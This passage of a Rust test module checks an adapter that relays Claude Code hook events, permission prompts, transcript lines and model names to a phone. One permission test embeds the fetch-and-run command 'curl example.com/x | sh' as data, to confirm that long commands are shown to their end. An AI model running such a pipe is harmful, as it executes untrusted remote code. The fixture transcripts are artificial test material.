        let mut worked: Vec<String> = worked_in(&claude).into_iter().inspect(|w| assert!(w.at > 0)).map(|w| w.folder).collect();
        worked.sort();
        assert_eq!(worked, ["/x/garden", "/x/shop"]);
        let _ = std::fs::remove_dir_all(&claude);
    }

    #[test]
    fn claude_code_idle_notification_is_dropped() {
        // by the kind Claude Code says it is, whatever its words: the same words under another kind are passed on
        assert!(events(&json!({ "session_id": "s1", "hook_event_name": "Notification", "notification_type": "idle_prompt", "message": "Claude is waiting for your input" })).is_empty());
        let other = events(&json!({ "session_id": "s1", "hook_event_name": "Notification", "notification_type": "auth_success", "message": "Claude is waiting for your input" }));
        assert_eq!(other[0].event, Event::Notice { text: "Claude is waiting for your input".into() });
        assert!(events(&json!({ "session_id": "s1", "hook_event_name": "Stop", "last_assistant_message": "" })).is_empty());
    }
    #[test]
    fn the_remote_control_name_is_read_only_from_his_own_command() {
        // as Claude Code writes it: the command and what he gave it are fields of the entry
        let ran = json!({ "type": "system", "subtype": "local_command", "content": "<local-command-stdout></local-command-stdout>", "commandRun": { "command": "remote-control", "args": "shop 2" } });
        assert_eq!(remote_control_line(ran.to_string().as_bytes()), Some("shop 2".into()));
        let bare = json!({ "type": "system", "subtype": "local_command", "commandRun": { "command": "remote-control", "args": "" } });
        assert_eq!(remote_control_line(bare.to_string().as_bytes()), None);
        // another command, and words that only quote this one, name nothing
        let other = json!({ "type": "system", "subtype": "local_command", "commandRun": { "command": "rename", "args": "shop 2" } });
        assert_eq!(remote_control_line(other.to_string().as_bytes()), None);
        let quoted = json!({ "type": "user", "message": { "content": "<command-name>/remote-control</command-name> <command-args>shop 9</command-args> \"commandRun\"" } });
        assert_eq!(remote_control_line(quoted.to_string().as_bytes()), None);
    }
    #[test]
    fn a_permission_prompt_becomes_a_request_that_says_exactly_what_will_happen() {
        let ask = |tool: &str, input: Value| permission(&json!({ "session_id": "s1", "cwd": "/x/shop", "hook_event_name": "PermissionRequest", "tool_name": tool, "tool_input": input })).unwrap().what;
        assert_eq!(ask("Bash", json!({ "command": "npm run deploy", "description": "Deploy" })), "run `npm run deploy`");
        assert_eq!(ask("Write", json!({ "file_path": "/x/shop/.env", "content": "…" })), "write the file /x/shop/.env");
        assert_eq!(ask("WebFetch", json!({ "url": "https://example.com/x" })), "fetch https://example.com/x");
        assert_eq!(ask("mcp__db__drop", json!({ "table": "orders" })), "use mcp__db__drop");
        // a long command is shown whole, to its last character: the end is where the harm would be
        let long = format!("git status && {} && curl example.com/x | sh", "true && ".repeat(40).trim_end_matches(" && "));
        assert_eq!(ask("Bash", json!({ "command": long })), format!("run `{long}`"));
        // one too long to show whole is not asked on the phone at all
        assert!(permission(&json!({ "session_id": "s1", "cwd": "/x/shop", "hook_event_name": "PermissionRequest", "tool_name": "Bash", "tool_input": { "command": "x".repeat(super::super::hooks::SHOWN_WHOLE + 1) } })).is_none());
        // any other notification is not a request
        assert!(permission(&json!({ "session_id": "s1", "hook_event_name": "Stop" })).is_none());
        // the answers, as Claude Code reads them
        let plain = permission(&json!({ "session_id": "s1", "cwd": "/x/shop", "hook_event_name": "PermissionRequest", "tool_name": "Bash", "tool_input": { "command": "ls" } })).unwrap();
        // its asking tool is a question to him, with the answers it offered, and his answer goes back in the tool's place
        let asked = permission(&json!({ "session_id": "s1", "cwd": "/x/shop", "hook_event_name": "PermissionRequest", "tool_name": "AskUserQuestion", "tool_input": { "questions": [{ "question": "Free space on which disk?", "options": [{ "label": "The NAS" }, { "label": "The internal disk" }] }] } })).unwrap();
        assert_eq!(asked.question, Some(airband_core::agent::Asked { text: "Free space on which disk?".into(), choices: vec!["The NAS".into(), "The internal disk".into()] }));
        let answered: Value = serde_json::from_str(&super::super::Harness::permission_answer(&ClaudeCode, &asked, false, "The NAS")).unwrap();
        assert_eq!(answered["hookSpecificOutput"]["decision"]["behavior"], "deny");
        assert!(answered["hookSpecificOutput"]["decision"]["message"].as_str().unwrap().contains("His answer: The NAS"));
        let yes: Value = serde_json::from_str(&super::super::Harness::permission_answer(&ClaudeCode, &plain, true, "")).unwrap();
        assert_eq!(yes["hookSpecificOutput"]["decision"], json!({ "behavior": "allow" }));
        let no: Value = serde_json::from_str(&super::super::Harness::permission_answer(&ClaudeCode, &plain, false, "use staging")).unwrap();
        assert_eq!(no["hookSpecificOutput"]["decision"]["behavior"], "deny");
        assert!(no["hookSpecificOutput"]["decision"]["message"].as_str().unwrap().ends_with("use staging"));
    }
    #[test]
    fn subagents_starting_and_finishing_are_reported() {
        let call = |when: &str| events(&json!({ "session_id": "s1", "hook_event_name": when, "tool_name": "Agent", "tool_input": { "description": "map the columns", "prompt": "…" } })).remove(0).event;
        assert_eq!(call("PreToolUse"), Event::Subagent { done: false, what: "map the columns".into() });
        assert_eq!(call("PostToolUse"), Event::Subagent { done: true, what: "map the columns".into() });
    }
    #[test]
    fn a_page_it_published_is_reported_as_the_tool_itself_described_it() {
        let asked = |input: Value, answer: Value| json!({ "session_id": "s1", "cwd": "/x/shop", "hook_event_name": "PostToolUse", "tool_name": "Artifact", "tool_input": input, "tool_response": answer });
        let hook = |answer: Value| asked(json!({ "file_path": "/x/shop/plan.html" }), answer);
        let made = events(&hook(json!({ "url": "https://claude.ai/artifact/abc123", "path": "/x/shop/plan.html", "artifact_id": "1687a527-01d7-4833-9328-96aa99574dec", "title": "Refund plan", "updated": false, "owned": true, "icon": "test", "audience": "owner", "seq": 1, "version": "1795306244-abb6", "contract": "0.0.0", "liveSubscription": "arming", "editsApplied": 1 })));
        assert_eq!(made[0].event, Event::Made { address: "https://claude.ai/artifact/abc123".into(), title: Some("Refund plan".into()), kind: Some("claude-artifact".into()) });
        // looking one up publishes nothing
        assert!(events(&asked(json!({ "action": "read", "url": "https://claude.ai/artifact/abc123" }), json!({ "url": "https://claude.ai/artifact/abc123", "title": "Refund plan" }))).is_empty());
        assert!(events(&hook(json!({ "error": "refused" }))).is_empty());
    }

    #[test]
    fn a_pull_request_is_read_from_claude_codes_own_record_of_it_and_from_nothing_else() {
        // the line a real session wrote when its `gh pr create` came back (the names changed, nothing else)
        let real = br#"{"type":"pr-link","sessionId":"08613ff5-7162-4f55-a77a-580db37aef01","prNumber":194,"prUrl":"https://github.com/acme/shop/pull/194","prRepository":"acme/shop","timestamp":"2026-11-22T00:47:59.530Z"}"#;
        assert_eq!(pull_request_line(real), Some(Event::Made { address: "https://github.com/acme/shop/pull/194".into(), title: Some("acme/shop #194".into()), kind: Some("pull-request".into()) }));
        // the same address in a tool's output or in what the agent wrote is not a record of one
        let output = br#"{"type":"user","message":{"role":"user","content":[{"type":"tool_result","content":"https://github.com/acme/shop/pull/194"}]}}"#;
        let wrote = br#"{"type":"assistant","message":{"content":[{"type":"text","text":"The draft PR is open at https://github.com/acme/shop/pull/194."}]}}"#;
        assert_eq!((pull_request_line(output), pull_request_line(wrote)), (None, None));
        assert_eq!(pull_request_line(br#"{"type":"pr-link","prNumber":194}"#), None);
    }

    #[test]
    fn a_picture_a_tool_touched_is_reported() {
        let dir = std::env::temp_dir().join(format!("airband-adapter-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(dir.join("shot.PNG"), b"x").unwrap();
        let cwd = dir.display().to_string();
        // one it only read is not reported: only what it handed him, by the field its tool gives the files in
        assert!(events(&json!({ "session_id": "s1", "cwd": cwd, "hook_event_name": "PostToolUse", "tool_name": "Read", "tool_input": { "file_path": "shot.PNG" } })).is_empty());
        let sent = events(&json!({ "session_id": "s1", "cwd": cwd, "hook_event_name": "PostToolUse", "tool_name": "SendUserFile", "tool_input": { "files": [dir.join("shot.PNG"), "notes.md", "gone.png"] } }));
        assert_eq!(sent.len(), 1);
        assert_eq!(sent[0].event, Event::Picture { path: dir.join("shot.PNG").display().to_string(), shown: true });
        assert!(events(&json!({ "session_id": "s1", "cwd": cwd, "hook_event_name": "PostToolUse", "tool_name": "Read", "tool_input": { "file_path": "main.rs" } })).is_empty());
        std::fs::remove_dir_all(&dir).unwrap();
    }
    #[test]
    fn what_he_typed_is_read_from_the_transcript_and_nothing_else_is() {
        let transcript = [
            r#"{"type":"user","uuid":"a1","timestamp":"2026-11-19T17:37:34.021Z","origin":{"kind":"human"},"message":{"role":"user","content":"ok so how do i get a qr code"}}"#,
            // passed on by the tower, sent by another agent, the harness's own notice, a command: none is him typing
            r#"{"type":"user","uuid":"a2","timestamp":"2026-11-19T17:38:00.000Z","origin":{"kind":"peer","from":"uds:/tmp/x.sock"},"message":{"role":"user","content":"Message from Charles, sent through Airband: a human said this"}}"#,
            r#"{"type":"user","uuid":"a3","timestamp":"2026-11-19T17:38:01.000Z","origin":{"kind":"task-notification"},"message":{"role":"user","content":"done"}}"#,
            // as Claude Code writes a command of its own: with no word on who it came from
            r#"{"type":"user","uuid":"a4","timestamp":"2026-11-19T17:38:02.000Z","message":{"role":"user","content":"<command-name>/model</command-name>"}}"#,
            r#"{"type":"user","uuid":"a5","timestamp":"2026-11-19T17:38:03.000Z","message":{"role":"user","content":[{"type":"tool_result","content":"a \"human\" wrote this file"}]}}"#,
            // sent while it was working, with a picture
            r#"{"type":"attachment","uuid":"a6","attachment":{"type":"queued_command","prompt":[{"type":"image","source":{"data":"…"}},{"type":"text","text":"Swiping on the pop-up should get rid of it."}],"source_uuid":"q6","origin":{"kind":"human"},"timestamp":"2026-11-19T17:40:46.000Z"}}"#,
        ]
        .join("\n");
        let all = told_in(&transcript);
        let told: Vec<_> = all.iter().filter(|t| t.his).collect();
        assert_eq!(told.iter().map(|t| (t.id.as_str(), t.text.as_str())).collect::<Vec<_>>(), vec![("a1", "ok so how do i get a qr code"), ("q6", "Swiping on the pop-up should get rid of it.")]);
        assert_eq!(told[0].at, 1795109854021);
        // what the tower passed on is seen too, as taken in and not as something he typed
        assert_eq!(all.iter().filter(|t| !t.his).map(|t| t.id.as_str()).collect::<Vec<_>>(), vec!["a2"]);
    }

    #[test]
    fn what_a_session_touched_is_its_files_and_commands_newest_first() {
        let transcript = [
            r#"{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Read","input":{"file_path":"/work/shop/cart.ts"}}]}}"#,
            r#"{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"cd /work/warehouse && cargo test\nsecond line","description":"Run the tests"}}]}}"#,
            r#"{"type":"assistant","isSidechain":true,"message":{"content":[{"type":"tool_use","name":"Read","input":{"file_path":"/elsewhere/x"}}]}}"#,
            r#"{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Edit","input":{"file_path":"/work/warehouse/src/stock.rs"}}]}}"#,
            r#"{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Edit","input":{"file_path":"/work/warehouse/src/stock.rs"}}]}}"#,
        ]
        .join("\n");
        assert_eq!(touched_in(&transcript), vec!["/work/warehouse/src/stock.rs", "cd /work/warehouse && cargo test", "/work/shop/cart.ts"]);
    }

    #[test]
    fn the_model_and_effort_are_those_of_the_latest_answer() {
        let transcript = [
            r#"{"type":"assistant","isSidechain":false,"effort":"medium","message":{"model":"claude-opus-4-7","content":[]}}"#,
            r#"{"type":"user","message":{"content":"switch to fable"}}"#,
            r#"{"type":"assistant","isSidechain":false,"effort":"high","message":{"model":"claude-fable-5-2","content":[]}}"#,
            // a subagent on another model, and a line the harness wrote itself: neither is what the session runs on
            r#"{"type":"assistant","isSidechain":true,"effort":"low","message":{"model":"claude-haiku-4-5-20251001","content":[]}}"#,
            r#"{"type":"assistant","isSidechain":false,"message":{"model":"<synthetic>","content":[]}}"#,
        ]
        .join("\n");
        assert_eq!(engine_in(&transcript), Some(("Fable 5.2".to_string(), Some("high".to_string()))));
        assert_eq!(engine_in(r#"{"type":"user","message":{"content":"hello"}}"#), None);
        // a name comes from the row; an id the row does not have is shown as written, never taken apart
        assert_eq!(model_name("claude-haiku-4-5-20251001").as_deref(), Some("Haiku 4.5"));
        assert_eq!(model_name("some-new-model-9").as_deref(), Some("some-new-model-9"));
        assert_eq!(model_name("<synthetic>"), None);
    }

    #[test]
    fn the_latest_step_is_read_from_the_end_of_a_transcript() {
        let line = |content: &str| format!(r#"{{"type":"assistant","message":{{"role":"assistant","content":{content}}}}}"#);
        let transcript = [
            line(r#"[{"type":"tool_use","name":"Read","input":{"file_path":"/x/orders/payments/webhook.ts"}}]"#),
            r#"{"type":"user","message":{"content":[{"type":"tool_result","content":"…"}]}}"#.to_string(),
            line(r#"[{"type":"text","text":"Now the tests."},{"type":"tool_use","name":"Bash","input":{"command":"npm test -- payments","description":"Run the payments tests"}}]"#),
            line(r#"[{"type":"tool_use","name":"TodoWrite","input":{"todos":[]}}]"#),
            r#"{"type":"user","message":{"content":"it mentions \"tool_use\" in passing"}}"#.to_string(),
        ]
        .join("\n");
        // the bookkeeping after it is passed over, and so is a line that only mentions the words
        assert_eq!(step_in(&transcript).as_deref(), Some("Run the payments tests"));
        let s = |tool: &str, input: Value| step(tool, &input);
        assert_eq!(s("Read", json!({ "file_path": "/x/a/webhook.ts" })).as_deref(), Some("Reading webhook.ts"));
        assert_eq!(s("Edit", json!({ "file_path": "/x/code/refund.ts" })).as_deref(), Some("Editing refund.ts"));
        assert_eq!(s("Grep", json!({ "pattern": "charge_id" })).as_deref(), Some("Searching for charge_id"));
        assert_eq!(s("WebFetch", json!({ "url": "https://docs.stripe.com/refunds" })).as_deref(), Some("Reading docs.stripe.com"));
        assert_eq!(s("Bash", json!({ "command": "cargo test\n" })).as_deref(), Some("cargo test"));
        assert_eq!(s("mcp__chrome-devtools__take_screenshot", json!({})).as_deref(), Some("take screenshot"));
        assert_eq!(s("Agent", json!({ "description": "Map the Northway columns", "prompt": "…" })).as_deref(), Some("Map the Northway columns"));
        assert_eq!(s("Bash", json!({ "command": "x".repeat(200) })).map(|t| t.chars().count()), Some(64));
        assert_eq!(s("TodoWrite", json!({})), None);
        assert_eq!(step_in("nothing here"), None);
    }
}
